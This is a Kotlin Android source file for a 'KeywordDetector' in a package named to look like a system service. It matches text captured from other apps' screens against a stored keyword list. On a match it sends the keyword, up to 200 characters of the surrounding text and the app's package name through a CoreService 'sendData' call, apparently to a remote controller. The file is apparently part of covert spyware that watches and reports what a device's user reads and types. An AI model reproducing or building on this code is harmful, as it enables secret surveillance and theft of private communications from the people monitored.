package com.system.service.monitors

import android.content.Context
import com.system.service.core.CoreService
import org.json.JSONArray
import org.json.JSONObject

object KeywordDetector {

    private const val PREFS = "keyword_detector"
    private const val KEY   = "keywords"

    private val keywords = mutableListOf<String>()

    fun init(context: Context) {
        val p = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val json = p.getString(KEY, "[]") ?: "[]"
        keywords.clear()
        try {
            val arr = JSONArray(json)
            for (i in 0 until arr.length()) keywords.add(arr.getString(i).lowercase())
        } catch (_: Exception) {}
    }

    fun setKeywords(list: List<String>, context: Context) {
        keywords.clear()
        keywords.addAll(list.map { it.lowercase() })
        val arr = JSONArray(list)
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putString(KEY, arr.toString()).apply()
    }

    /** Check text. If any keyword matches → send alert. Returns matched keyword or null */
    fun check(text: String, pkg: String, source: String = "screen"): String? {
        if (keywords.isEmpty() || text.isBlank()) return null
        val lower = text.lowercase()
        val matched = keywords.firstOrNull { lower.contains(it) } ?: return null
        CoreService.instance?.sendData("keyword_alert", JSONObject().apply {
            put("keyword", matched)
            put("text",    text.take(200))
            put("package", pkg)
            put("source",  source)
        })
        return matched
    }

    fun getKeywords() = keywords.toList()
}
